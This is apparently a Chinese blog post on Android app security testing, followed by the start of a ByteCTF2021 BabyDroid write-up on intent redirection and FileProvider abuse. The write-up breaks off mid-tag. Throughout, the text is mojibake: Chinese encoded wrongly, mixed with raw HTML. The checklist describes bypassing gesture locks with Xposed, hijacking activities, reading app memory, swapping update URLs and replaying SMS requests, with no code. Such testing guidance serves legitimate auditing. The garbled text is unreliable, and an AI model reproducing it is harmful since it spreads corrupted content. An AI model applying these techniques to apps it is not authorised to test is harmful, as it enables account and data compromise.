ä¸­åœ¨çª—å£åŠ è½½æ—¶æ˜¯å¦æœ‰ç±»ä¼¼ä¸‹å›¾çš„ä»£ç ã€‚æŒ‰ç…§ android SDK çš„è¦æ±‚ï¼Œå¼€å¯ FLAG_SECURE é€‰é¡¹çš„çª—å£ä¸èƒ½è¢«æˆªå±ã€‚<img src="/posts/f416437f.htm/image-20241005211913001.png" alt="image-20241005211913001"></p><p>ç›®å‰ FLAG_SECURE æµ‹è¯•ç»“æœï¼š</p><p>Nï¼PASSï¼Œå¯æˆªå›¾ï¼Œ</p><p>ZTE 880E, å¯æˆªå›¾</p><p>ASUS TF300Tï¼Œå¯é˜»æ­¢å·¥å…·åŠ ddms æˆªå›¾ã€‚</p><h3 id="æ‰‹åŠ¿å¯†ç ">æ‰‹åŠ¿å¯†ç </h3><p>ä¸»è¦ä»æ‰‹åŠ¿å¯†ç çš„å¤æ‚åº¦ã€ä¿®æ”¹å’Œå–æ¶ˆã€æœ¬åœ°ä¿¡æ¯ä¿å­˜ã€é”å®šç­–ç•¥ã€æŠ—æ”»å‡»æµ‹è¯•ç­‰æ–¹é¢è¿›è¡Œæµ‹è¯•ã€‚</p><p><strong>æ‰‹åŠ¿å¯†ç çš„å¤æ‚åº¦ï¼š</strong></p><p>è§‚å¯Ÿå¯¹åº”ä»£ç é€»è¾‘æ˜¯å¦æœ‰ç›¸åº”çš„åˆ¤æ–­å’Œé™åˆ¶æ¡ä»¶ã€‚ï¼ˆä¸€èˆ¬è®¾ç½®æ‰‹åŠ¿å¯†ç è‹¥è¾“å…¥ç‚¹æ•°è¿‡å°‘æ—¶ä¼šæœ‰ç›¸åº”çš„æ–‡å­—æç¤ºï¼Œé€šè¿‡æ­¤æ–‡å­—æç¤ºå¯ä»¥å¿«é€Ÿå®šä½åˆ°ä»£ç ä½ç½®ï¼‰</p><p><strong>æ‰‹åŠ¿å¯†ç çš„ä¿®æ”¹å’Œå–æ¶ˆï¼š</strong></p><p>åç¼–è¯‘ APK ä¸º jar åŒ…ï¼Œé€šè¿‡ jd-gui è§‚å¯Ÿå¯¹åº”ä»£ç é€»è¾‘ï¼Œå¯»æ‰¾å®¢æˆ·ç«¯å¯¹äºæ‰‹åŠ¿å¯†ç çš„ä¿®æ”¹å’Œåˆ é™¤æ˜¯å¦å­˜åœ¨ç›¸åº”çš„å®‰å…¨ç­–ç•¥ã€‚</p><p><strong>æ‰‹åŠ¿å¯†ç çš„æœ¬åœ°ä¿¡æ¯ä¿å­˜ï¼š</strong></p><p>é¦–å…ˆé€šè¿‡æ­£å¸¸çš„æ“ä½œæµç¨‹è®¾ç½®ä¸€ä¸ªæ‰‹åŠ¿å¯†ç å¹¶å®Œæ•´ä¸€æ¬¡å®Œæ•´çš„ç™»é™†è¿‡ç¨‹ï¼Œå¯»æ‰¾/data/data çš„ç§æœ‰ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨æ‰‹åŠ¿å¯†ç å¯¹åº”æ•æ„Ÿæ–‡ä»¶ï¼Œè‹¥è¿›è¡Œäº†ç›¸å…³çš„ä¿¡æ¯ä¿å­˜ï¼ŒåŸºæœ¬åœ¨æ­¤ç›®å½•ä¸‹ã€‚ï¼ˆå…³é”®è¯ä¸º gestureï¼Œkey ç­‰ï¼‰ã€‚è§‚å¯Ÿå­˜å‚¨æ–¹å¼æ˜¯äºŒè¿›åˆ¶å½¢å¼è¿˜æ˜¯æ˜æ–‡å½¢å¼ï¼Œå¦‚æœæ˜¯äºŒè¿›åˆ¶çœ‹çœ‹å…¶å¯¹åº”ä½æ•°åˆ¤æ–­è¿›è¡Œçš„ä»€ä¹ˆå“ˆå¸Œæ•£åˆ—ã€‚ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªæ•°å€¼å®šä¹‰ä»£ç ä½ç½®è¿›ä¸€æ­¥åˆ†æ</p><p><strong>æ‰‹åŠ¿å¯†ç çš„æŠ—æ”»å‡»æµ‹è¯•ï¼š</strong></p><ol><li><p>ä¸‹è½½å¹¶å®‰è£… Xposed æ¡†æ¶åŠ SwipeBack æ’ä»¶ã€‚</p></li><li><p>å¯åŠ¨å®¢æˆ·ç«¯å¹¶è¿›å…¥æ‰‹åŠ¿å¯†ç è¾“å…¥é¡µã€‚</p></li><li><p>å¯åŠ¨ SwipeBack æ’ä»¶ï¼Œè§‚å¯Ÿæ˜¯å¦å¯ä»¥é€šè¿‡æ»‘åŠ¨å…³é—­æ‰‹åŠ¿å¯†ç è¾“å…¥é¡µçš„æ–¹å¼è¿›å…¥ç™»é™†åçš„é¡µé¢</p></li></ol><h2 id="å®‰å…¨ç­–ç•¥">å®‰å…¨ç­–ç•¥</h2><h3 id="å¯†ç å¤æ‚åº¦æ£€æµ‹">å¯†ç å¤æ‚åº¦æ£€æµ‹</h3><p>æµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºæ˜¯å¦æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„å¯†ç å¼ºåº¦ï¼Œç¦æ­¢ç”¨æˆ·è®¾ç½®å¼±å£ä»¤</p><p>äººå·¥æµ‹è¯•ï¼Œå°è¯•å°†å¯†ç ä¿®æ”¹ä¸ºå¼±å£ä»¤ï¼Œå¦‚ï¼š123456ï¼Œ654321ï¼Œ121212ï¼Œ888888 ç­‰ï¼ŒæŸ¥çœ‹å®¢æˆ·ç«¯æ˜¯å¦æ‹’ç»å¼±å£ä»¤ã€‚ä¹Ÿå¯ä»¥é˜…è¯»é€†å‘åçš„å®¢æˆ·ç«¯ java ä»£ç ï¼Œå¯»æ‰¾å¯¹ç”¨æˆ·è¾“å…¥å£ä»¤çš„æ£€æŸ¥æ–¹æ³•ã€‚</p><h3 id="è´¦å·ç™»å½•é™åˆ¶">è´¦å·ç™»å½•é™åˆ¶</h3><p>æµ‹è¯•ä¸€ä¸ªå¸å·æ˜¯å¦å¯ä»¥åŒæ—¶åœ¨å¤šä¸ªè®¾å¤‡ä¸ŠæˆåŠŸç™»å½•å®¢æˆ·ç«¯ï¼Œè¿›è¡Œæ“ä½œã€‚</p><p>äººå·¥æµ‹è¯•ã€‚</p><h3 id="è´¦æˆ·é”å®šç­–ç•¥"><strong>è´¦æˆ·é”å®šç­–ç•¥</strong></h3><p>æµ‹è¯•å®¢æˆ·ç«¯æ˜¯å¦é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°ã€‚é˜²æ­¢æœ¨é©¬ä½¿ç”¨ç©·ä¸¾æ³•æš´åŠ›ç ´è§£ç”¨æˆ·å¯†ç </p><p>äººå·¥æµ‹è¯•ã€‚</p><h3 id="é—®é¢˜éªŒè¯">é—®é¢˜éªŒè¯</h3><p>æµ‹è¯•å¯¹è´¦å·æŸäº›ä¿¡æ¯ï¼ˆå¦‚å•æ¬¡æ”¯ä»˜é™é¢ï¼‰çš„ä¿®æ”¹æ˜¯å¦æœ‰ç§å¯†é—®é¢˜éªŒè¯ã€‚ç§å¯†é—®é¢˜éªŒè¯æ˜¯å¦å°†é—®é¢˜å’Œç­”æ¡ˆä¸€ä¸€å¯¹åº”ã€‚ç§å¯†é—®é¢˜æ˜¯å¦è¶³å¤Ÿç§å¯†</p><p>äººå·¥æµ‹è¯•</p><h3 id="ä¼šè¯å®‰å…¨">ä¼šè¯å®‰å…¨</h3><p>æµ‹è¯•å®¢æˆ·ç«¯åœ¨è¶…è¿‡ 20 åˆ†é’Ÿæ— æ“ä½œåï¼Œæ˜¯å¦ä¼šä½¿ä¼šè¯è¶…æ—¶å¹¶è¦æ±‚é‡æ–°ç™»å½•ã€‚è¶…æ—¶æ—¶é—´è®¾ç½®æ˜¯å¦åˆç†ã€‚</p><p>äººå·¥æµ‹è¯•</p><h3 id="ç•Œé¢åˆ‡æ¢ä¿æŠ¤">ç•Œé¢åˆ‡æ¢ä¿æŠ¤</h3><p>æ£€æŸ¥å®¢æˆ·ç«¯ç¨‹åºåœ¨åˆ‡æ¢åˆ°å…¶ä»–åº”ç”¨æ—¶ï¼Œå·²ç»å¡«å†™çš„è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯æ˜¯å¦ä¼šæ¸…ç©ºï¼Œé˜²æ­¢ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚å¦‚æœåˆ‡æ¢å‰å¤„äºå·²ç™»å½•çŠ¶æ€ï¼Œåˆ‡æ¢åä¸€å®šæ—¶é—´å†…æ˜¯å¦ä¼šè‡ªåŠ¨é€€å‡ºå½“å‰ä¼šè¯ã€‚</p><p><strong>æµ‹è¯•æ­¥éª¤</strong></p><p>äººå·¥æ£€æµ‹ã€‚åœ¨ç™»å½•ç•Œé¢ï¼ˆæˆ–è€…è½¬è´¦ç•Œé¢ç­‰æ¶‰åŠå¯†ç çš„åŠŸèƒ½ï¼‰å¡«å†™ç™»å½•åå’Œå¯†ç ï¼Œç„¶ååˆ‡å‡ºï¼Œå†è¿›å…¥å®¢æˆ·ç«¯ï¼Œçœ‹è¾“å…¥çš„ç™»å½•åå’Œå¯†ç æ˜¯å¦æ¸…é™¤ã€‚ç™»å½•ååˆ‡å‡ºï¼Œ5 åˆ†é’Ÿå†…è‡ªåŠ¨é€€å‡ºä¸ºå®‰å…¨</p><h3 id="UIä¿¡æ¯æ³„éœ²">UIä¿¡æ¯æ³„éœ²</h3><p>æ£€æŸ¥å®¢æˆ·ç«¯çš„å„ç§åŠŸèƒ½ï¼Œçœ‹æ˜¯å¦å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚</p><p>äººå·¥æµ‹è¯•ã€‚ä½¿ç”¨é”™è¯¯çš„ç™»å½•åæˆ–å¯†ç ç™»å½•ï¼Œçœ‹å®¢æˆ·ç«¯æç¤ºæ˜¯å¦ä¸åŒã€‚åœ¨æ˜¾ç¤ºå¡å·ç­‰æ•æ„Ÿä¿¡æ¯æ—¶æ˜¯å¦è¿›è¡Œéƒ¨åˆ†é®æŒ¡ã€‚</p><h3 id="éªŒè¯ç å®‰å…¨">éªŒè¯ç å®‰å…¨</h3><p>æµ‹è¯•å®¢æˆ·ç«¯åœ¨ç™»å½•å’Œäº¤æ˜“æ—¶æ˜¯å¦ä½¿ç”¨å›¾å½¢éªŒè¯ç ã€‚éªŒè¯ç æ˜¯å¦ç¬¦åˆå¦‚ä¸‹è¦æ±‚ï¼šç”±æ•°å­—å’Œå­—æ¯ç­‰å­—ç¬¦æ··åˆç»„æˆï¼›é‡‡å–å›¾ç‰‡åº•çº¹å¹²æ‰°ã€é¢œè‰²å˜æ¢ã€è®¾ç½®éè¿ç»­æ€§åŠæ—‹è½¬å›¾ç‰‡å­—ä½“ã€å˜å¼‚å­—ä½“æ˜¾ç¤ºæ ·å¼ç­‰æœ‰æ•ˆæ–¹å¼ï¼Œé˜²èŒƒæ¶æ„ä»£ç è‡ªåŠ¨è¯†åˆ«å›¾ç‰‡ä¸Šçš„ä¿¡æ¯ï¼›å…·æœ‰ä½¿ç”¨æ—¶é—´é™åˆ¶å¹¶ä»…èƒ½ä½¿ç”¨ä¸€æ¬¡ï¼›éªŒè¯ç ç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œå®¢æˆ·ç«¯æ–‡ä»¶ä¸­ä¸åŒ…å«å›¾å½¢éªŒè¯ç æ–‡æœ¬å†…å®¹ã€‚</p><h3 id="å®‰å…¨é€€å‡º">å®‰å…¨é€€å‡º</h3><p>æµ‹è¯•å®¢æˆ·ç«¯é€€å‡ºæ—¶æ˜¯å¦æ­£å¸¸ç»ˆæ­¢ä¼šè¯ã€‚</p><p>æ£€æŸ¥å®¢æˆ·ç«¯åœ¨é€€å‡ºæ—¶ï¼Œæ˜¯å¦å‘æœåŠ¡ç«¯å‘é€ç»ˆæ­¢ä¼šè¯è¯·æ±‚ã€‚å®¢æˆ·ç«¯é€€å‡ºåï¼Œè¿˜èƒ½å¦ä½¿ç”¨é€€å‡ºå‰çš„ä¼šè¯ id è®¿é—®ç™»å½•åæ‰èƒ½è®¿é—®çš„é¡µé¢</p><h3 id="å¯†ç ä¿®æ”¹éªŒè¯">å¯†ç ä¿®æ”¹éªŒè¯</h3><p>æµ‹è¯•å®¢æˆ·ç«¯åœ¨ä¿®æ”¹å¯†ç æ—¶æ˜¯å¦éªŒè¯æ—§å¯†ç æ­£ç¡®æ€§ã€‚</p><p>äººå·¥æµ‹è¯•ã€‚</p><h3 id="Activity-ç•Œé¢åŠ«æŒ"><strong>Activity ç•Œé¢åŠ«æŒ</strong></h3><p>æ£€æŸ¥æ˜¯å¦å­˜åœ¨ activity åŠ«æŒé£é™©ï¼Œç¡®è®¤å®¢æˆ·ç«¯æ˜¯å¦èƒ½å¤Ÿå‘ç°å¹¶æç¤ºç”¨æˆ·å­˜åœ¨åŠ«æŒã€‚</p><p>å®‰è£… HijackActivity.apkï¼Œä½¿ç”¨ activity ç•Œé¢åŠ«æŒå·¥å…·ï¼Œåœ¨å·¥å…·ä¸­æŒ‡å®šè¦åŠ«æŒçš„åº”ç”¨è¿›ç¨‹åç§°ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œä»åˆ—è¡¨ä¸­é€‰æ‹©è¢«æµ‹è¯•çš„åº”ç”¨ï¼Œç‚¹å‡» OKã€‚æ‰“å¼€åº”ç”¨ï¼Œæµ‹è¯•å·¥å…·ä¼šå°è¯•ç”¨è‡ªå·±çš„çª—å£è¦†ç›–è¢«æµ‹çš„åº”ç”¨</p><h2 id="è¿›ç¨‹ä¿æŠ¤">è¿›ç¨‹ä¿æŠ¤</h2><h3 id="å†…å­˜è®¿é—®å’Œä¿®æ”¹"><strong>å†…å­˜è®¿é—®å’Œä¿®æ”¹</strong></h3><p>é€šè¿‡å¯¹å®¢æˆ·ç«¯å†…å­˜çš„è®¿é—®ï¼Œæœ¨é©¬å°†æœ‰å¯èƒ½ä¼šå¾—åˆ°ä¿å­˜åœ¨å†…å­˜ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ç™»å½•å¯†ç ï¼Œå¸å·ç­‰ï¼‰ã€‚æµ‹è¯•å®¢æˆ·ç«¯å†…å­˜ä¸­æ˜¯å¦å­˜åœ¨çš„æ•æ„Ÿä¿¡æ¯ï¼ˆè´¦å·ã€æ˜æ–‡å¯†ç ç­‰ç­‰ï¼‰ã€‚</p><p>éœ€è¦ root æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ MemSpector æŸ¥çœ‹ã€æœç´¢å’Œä¿®æ”¹å®¢æˆ·ç«¯å†…å­˜æ•°æ®ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚ç”¨æˆ·åã€å¯†ç ç­‰æ•°æ®é€šå¸¸ä¼šåœ¨/dev/ashmem/dalvik-heap å†…å­˜æ®µã€‚ï¼ˆç›®å‰å¤§å¤šæ•°å·¥å…·éƒ½æ˜¯é€šè¿‡ ptrace æ¥å£ä¿®æ”¹å®¢æˆ·ç«¯å†…å­˜ï¼Œå¯ä»¥ä½¿ç”¨ ptrace æœºåˆ¶æœ¬èº«é˜²æŠ¤ã€‚ï¼‰</p><h3 id="åŠ¨æ€æ³¨å…¥"><strong>åŠ¨æ€æ³¨å…¥</strong></h3><p>é€šè¿‡æ³¨å…¥åŠ¨æ€é“¾æ¥åº“ï¼Œhook å®¢æˆ·ç«¯æŸäº›å…³é”®å‡½æ•°ï¼Œä»è€Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–è€…æ”¹å˜ç¨‹åºæ‰§è¡Œã€‚</p><h2 id="é€šä¿¡å®‰å…¨">é€šä¿¡å®‰å…¨</h2><p>å¦‚æœå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡åŠ å¯†åè®®å®ç°ä¸å½“ï¼Œæ”»å‡»è€…å°†æœ‰æœºä¼šå¯¹å½“å‰ç½‘ç»œç¯å¢ƒä¸­å…¶ä»–åˆæ³•ç”¨æˆ·çš„é€šä¿¡å†…å®¹è¿›è¡Œçªƒå¬ç”šè‡³ç¯¡æ”¹ã€‚</p><h3 id="è¯ä¹¦æœ‰æ•ˆæ€§"><strong>è¯ä¹¦æœ‰æ•ˆæ€§</strong></h3><p>ä¸»è¦æµ‹è¯• SSL åè®®å®‰å…¨æ€§ã€SSL è¯ä¹¦éªŒè¯ç­‰</p><p>é¦–å…ˆæµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºæ˜¯å¦ä¸¥æ ¼æ£€æŸ¥æœåŠ¡å™¨ç«¯è¯ä¹¦ä¿¡æ¯ã€‚é€šè¿‡ä¿®æ”¹ DNSï¼Œå°†å®¢æˆ·ç«¯é“¾æ¥åˆ°çš„ä¸»é¡µåœ°å€æ”¹ä¸º <a href="https://mail.qq.com/%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%98%AF%E5%90%A6%E4%BC%9A%E6%8F%90%E7%A4%BA%E8%BF%9E%E6%8E%A5%E9%94%99%E8%AF%AF%E3%80%82%E6%AD%A4%E9%A1%B9%E6%B5%8B%E8%AF%95%E4%B8%BB%E8%A6%81%E9%92%88%E5%AF%B9%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%98%AF%E5%90%A6%E5%AF%B9">https://mail.qq.com/ï¼Œç„¶åä½¿ç”¨å®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯ï¼ŒæŸ¥çœ‹å®¢æˆ·ç«¯æ˜¯å¦ä¼šæç¤ºè¿æ¥é”™è¯¯ã€‚æ­¤é¡¹æµ‹è¯•ä¸»è¦é’ˆå¯¹å®¢æˆ·ç«¯æ˜¯å¦å¯¹</a> SSL è¯ä¹¦ä¸­çš„åŸŸåè¿›è¡Œç¡®è®¤ã€‚</p><p>ä¹Ÿå¯ä»¥æŸ¥é˜…ä»£ç ä¸­æ˜¯å¦æœ‰ SSL éªŒè¯ã€‚ä¸‹å›¾æ˜¯ Java ä¸­è¿›è¡ŒæœåŠ¡ç«¯ SSL è¯ä¹¦éªŒè¯çš„ä¸€ç§æ–¹å¼ã€‚å…³é”®å‡½æ•°ä¸ºï¼šjava.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier()ï¼Œé€šè¿‡æ­¤å‡½æ•°æŸ¥æ‰¾ HostnameVerifier çš„ verify å‡½æ•°ã€‚å¦‚ verify()å‡½æ•°æ€»è¿”å› trueï¼Œåˆ™å®¢æˆ·ç«¯å¯¹æœåŠ¡ç«¯ SSL è¯ä¹¦æ— éªŒè¯ã€‚ï¼ˆå¯èƒ½è¿˜æœ‰å…¶ä»– SSL å®ç°ï¼Œéœ€è¦éªŒè¯ï¼‰ã€‚</p><p><strong>å®‰å…¨å»ºè®®</strong></p><p>ä½¿ç”¨ Https æ–¹å¼è¿›è¡ŒåŠ å¯†ï¼Œä¸”æœåŠ¡å™¨é€šè¿‡ç™½åå•æ–¹å¼éªŒè¯å®¢æˆ·ç«¯è¯ä¹¦ã€‚</p><h3 id="å…³é”®æ•°æ®åŠ å¯†å’Œæ ¡æ£€"><strong>å…³é”®æ•°æ®åŠ å¯†å’Œæ ¡æ£€</strong></h3><p>æµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºæäº¤æ•°æ®ç»™æœåŠ¡ç«¯æ—¶ï¼Œå¯†ç ã€æ”¶æ¬¾äººä¿¡æ¯ç­‰å…³é”®å­—æ®µæ˜¯å¦è¿›è¡Œäº†åŠ å¯†ï¼Œé˜²æ­¢æ¶æ„ç”¨æˆ·å—…æ¢åˆ°ç”¨æˆ·æ•°æ®åŒ…ä¸­çš„å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p><p>åœ¨æ‰‹æœºä¸Šé…ç½®å¥½ä»£ç†ï¼Œè§‚å¯Ÿå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„äº¤äº’æ•°æ®ã€‚æ£€æŸ¥å…³é”®å­—ç«¯æ˜¯å¦åŠ å¯†ã€‚å¦‚æœå®¢æˆ·ç«¯å¯¹æ ¹è¯ä¹¦è¿›è¡Œäº†ä¸¥æ ¼æ£€æµ‹ï¼Œå¯¼è‡´ä»£ç†æ— æ³•ä½¿ç”¨ã€‚åˆ™å¯ä»¥å°†ä»£ç†çš„æ ¹è¯ä¹¦å®‰è£…åˆ°è®¾å¤‡ä¸Šï¼Œä½¿æ ¹è¯ä¹¦å¯ä¿¡ã€‚æˆ–æ˜¯æ›¿æ¢å®¢æˆ·ç«¯ apk ä¸­çš„æ ¹è¯ä¹¦æ–‡ä»¶ã€‚å¦‚æœä¸Šè¿°æ–¹æ³•å‡å¤±æ•ˆï¼Œåˆ™åç¼–è¯‘ä¸º java ä»£ç ï¼Œå°†å®¢æˆ·ç«¯é€†å‘åï¼Œé€šè¿‡é˜…è¯» java ä»£ç çš„æ–¹å¼å¯»æ‰¾å®¢æˆ·ç«¯ç¨‹åºå‘æœåŠ¡ç«¯æäº¤æ•°æ®çš„ä»£ç ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨åŠ å¯†çš„ä»£ç ã€‚</p><h3 id="è®¿é—®æ§åˆ¶"><strong>è®¿é—®æ§åˆ¶</strong></h3><p>æµ‹è¯•å®¢æˆ·ç«¯è®¿é—®çš„ URL æ˜¯å¦ä»…èƒ½ç”±æ‰‹æœºå®¢æˆ·ç«¯è®¿é—®ã€‚æ˜¯å¦å¯ä»¥ç»•è¿‡ç™»å½•é™åˆ¶ç›´æ¥è®¿é—®ç™»å½•åæ‰èƒ½è®¿é—®çš„é¡µé¢ï¼Œå¯¹éœ€è¦äºŒæ¬¡éªŒè¯çš„é¡µé¢ï¼ˆå¦‚ç§å¯†é—®é¢˜éªŒè¯ï¼‰ï¼Œèƒ½å¦ç»•è¿‡éªŒè¯ã€‚</p><p>äººå·¥æµ‹è¯•ã€‚åœ¨ PC æœºçš„æµè§ˆå™¨é‡Œè¾“å…¥ URLï¼Œå°è¯•è®¿é—®æ‰‹æœºé¡µé¢</p><h3 id="å®¢æˆ·ç«¯æ›´æ–°å®‰å…¨æ€§"><strong>å®¢æˆ·ç«¯æ›´æ–°å®‰å…¨æ€§</strong></h3><p>æµ‹è¯•å®¢æˆ·ç«¯è‡ªåŠ¨æ›´æ–°æœºåˆ¶æ˜¯å¦å®‰å…¨ã€‚å¦‚æœå®¢æˆ·ç«¯æ›´æ–°æ²¡æœ‰ä½¿ç”¨å®˜æ–¹åº”ç”¨å•†åº—çš„æ›´æ–°æ–¹å¼ï¼Œå°±å¯èƒ½å¯¼è‡´ç”¨æˆ·ä¸‹è½½å¹¶å®‰è£…æ¶æ„åº”ç”¨ï¼Œä»è€Œå¼•å…¥å®‰å…¨é£é™©ã€‚</p><p>ä½¿ç”¨ä»£ç†æŠ“å–æ£€æµ‹æ›´æ–°çš„æ•°æ®åŒ…ï¼Œå°è¯•å°†æœåŠ¡å™¨è¿”å›çš„æ›´æ–° url æ›¿æ¢ä¸ºæ¶æ„é“¾æ¥ã€‚çœ‹å®¢æˆ·ç«¯æ˜¯å¦ä¼šç›´æ¥æ‰“å¼€æ­¤é“¾æ¥å¹¶ä¸‹è½½åº”ç”¨ã€‚åœ¨åº”ç”¨ä¸‹è½½å®Œæ¯•åï¼Œæµ‹è¯•èƒ½å¦æ›¿æ¢ä¸‹è½½çš„ apk æ–‡ä»¶ï¼Œæµ‹è¯•å®¢æˆ·ç«¯æ˜¯å¦ä¼šå®‰è£…æ›¿æ¢åçš„åº”ç”¨ã€‚</p><h3 id="çŸ­ä¿¡é‡æ”¾æ”»å‡»"><strong>çŸ­ä¿¡é‡æ”¾æ”»å‡»</strong></h3><p>æ£€æµ‹åº”ç”¨ä¸­æ˜¯å¦å­˜åœ¨æ•°æ®åŒ…é‡æ”¾æ”»å‡»çš„å®‰å…¨é—®é¢˜ã€‚æ˜¯å¦ä¼šå¯¹å®¢æˆ·ç«¯ç”¨æˆ·é€ æˆçŸ­ä¿¡è½°ç‚¸çš„å›°æ‰°</p><p>å°è¯•é‡æ”¾çŸ­ä¿¡éªŒè¯ç æ•°æ®åŒ…æ˜¯å¦å¯ä»¥è¿›è¡ŒçŸ­ä¿¡è½°ç‚¸æ”»å‡»</p><h2 id="ä¸šåŠ¡å®‰å…¨">ä¸šåŠ¡å®‰å…¨</h2><h3 id="è¶Šæƒ">è¶Šæƒ</h3><p>æœåŠ¡å™¨ç«¯å¯¹å®¢æˆ·æå‡ºçš„æ•°æ®æ“ä½œè¯·æ±‚è¿‡åˆ†ä¿¡ä»»ï¼Œå¿½ç•¥äº†å¯¹è¯¥ç”¨æˆ·æ“ä½œæƒé™çš„åˆ¤å®šï¼Œå¯¼è‡´æ”»å‡»è´¦å·æ‹¥æœ‰äº†å…¶ä»–è´¦æˆ·çš„å¢åˆ æ”¹æŸ¥åŠŸèƒ½ã€‚</p><p>æ‰‹å·¥æµ‹è¯•</p><h3 id="äº¤æ˜“ç¯¡æ”¹"><strong>äº¤æ˜“ç¯¡æ”¹</strong></h3><p>æœ¬é¡¹æµ‹è¯•ä¸»è¦æ˜¯ä¿®æ”¹é‡‘é¢ä¿¡æ¯ï¼ˆå¦‚ï¼šè½¬å¸é‡‘é¢ä¸ºè´Ÿå€¼ï¼‰ï¼Œè®¢å•ä¿¡æ¯ï¼ˆå¦‚ï¼šè®¢å•çš„æ•°é‡ï¼‰ç­‰</p><p>æ‰‹å·¥æŠ“åŒ…æµ‹è¯•ã€‚</p><p>æœåŠ¡ç«¯è¦åšåˆ°ä¸¥æ ¼çš„éªŒè¯ã€‚ï¼ˆæ ¹æ®ä¸šåŠ¡æƒ…å½¢ä¸åŒï¼Œå®‰å…¨å»ºè®®ä¹Ÿä¸ç›¸åŒï¼Œå› æ­¤è¿™é‡Œåªèƒ½ç®€å•çš„ä¸€å¥è¯æè¿°ï¼‰</p><h3 id="é‡æ”¾æ”»å‡»">é‡æ”¾æ”»å‡»</h3><p>ä¸»è¦å°±æ˜¯è¿›è¡ŒæŠ“åŒ…é‡æ”¾ï¼ˆå¦‚ï¼šé‡æ”¾äº§å“è´­ä¹°ã€è®¢å•åˆ›é€ ç­‰ï¼‰æµ‹è¯•ã€‚</p><p>äººå·¥æµ‹è¯•</p><h3 id="ç”¨æˆ·æšä¸¾">ç”¨æˆ·æšä¸¾</h3><p>å°è¯•çˆ†ç ´æšä¸¾ç”¨æˆ·ã€‚</p><p>æ‰‹å·¥æµ‹è¯•ã€‚</p><p>æ­¤ç±»æ¼æ´æƒ…å¢ƒä¸€èˆ¬æ˜¯ï¼šç™»å½•ç•Œé¢æ— éªŒè¯ç ã€æœ‰æ˜æ˜¾çš„è¿”å›ä¿¡æ¯ï¼ˆå¦‚ï¼šè¯¥è´¦å·ä¸å­˜åœ¨ã€å¯†ç é”™è¯¯ç­‰ï¼‰</p><h3 id="æš´åŠ›ç ´è§£">æš´åŠ›ç ´è§£</h3><p>ä¸»è¦æ˜¯æµ‹è¯•ä¸šåŠ¡ä¸­æŸ¥è¯¢ã€ç™»å½•ç­‰åŠŸèƒ½ï¼Œå°è¯•ä½¿ç”¨æš´åŠ›æšä¸¾çš„æ–¹å¼è¿›è¡Œç ´è§£</p><p>æ‰‹å·¥æµ‹è¯•</p><h3 id="æ³¨å…¥-XSS-CSRF"><strong>æ³¨å…¥/XSS/CSRF</strong></h3><p>å’Œ WEB æµ‹è¯•ç±»ä¼¼ï¼Œä¸»è¦æµ‹è¯•ç«™ç‚¹å­˜åœ¨çš„å¸¸è§çš„ web æ¼æ´</p><p>å¯æ‰‹å·¥æµ‹è¯•ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·æ‰«æã€æµ‹è¯•</p><h1>æ¼æ´çš„ä¸€äº›åˆ†æ ByteCTF2021</h1><p><a href="https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg">https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg</a></p><p><a href="https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/">https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/7/#%3Cstrong%3EHardDroid%3C%2Fstrong%3E">https://blog.wm-team.cn/index.php/archives/7/#&lt;strong&gt;HardDroid&lt;%2Fstrong&gt;</a></p><h2 id="BabyDroid">BabyDroid</h2><h3 id="è€ƒç‚¹ï¼š"><strong>è€ƒç‚¹</strong>ï¼š</h3><ul><li>Intenté‡å®šå‘</li><li>Grant Uri Permission é€šè¿‡fileproviderä»»æ„è¯»å†™</li></ul><p>å¯¹äº<code>é¢˜ç›®éƒ¨ç½²å’Œè¿è¡Œç¯å¢ƒ</code>æ²¡æœ‰å¤ªè¿‡ç ”ç©¶ï¼Œä¸»è¦æ˜¯å¯¹æ¼æ´åŠ æ·±ç†è§£ï¼Œå­¦ä¹ ä¸€ä¸‹æ€è·¯</p><h3 id="apkåˆ†æ">apkåˆ†æ</h3><p><strong>Manifest.xml</strong></p><p>å¯¹äºè¿™é“é¢˜çœ‹ä¸€ä¸‹Vulnerable.apkçš„æ¸…å•æ–‡ä»¶</p><p><img src="/posts/f416437f.htm/image-20241009194758416.png" alt="image-20241009194758416"></p><p>ä¸»è¦æ˜¯ä¸Šé¢çº¢æ¡†å†…å®¹ï¼š2ä¸ªActivityï¼Œä¸€ä¸ªReceiverï¼Œä¸€ä¸ªproviderã€‚</p><p><strong>MainActivity</strong></p><p>ä¸»è¦å°±æ˜¯åŠ è½½å¸ƒå±€</p><p><strong>Vulnerable</strong></p><p><img 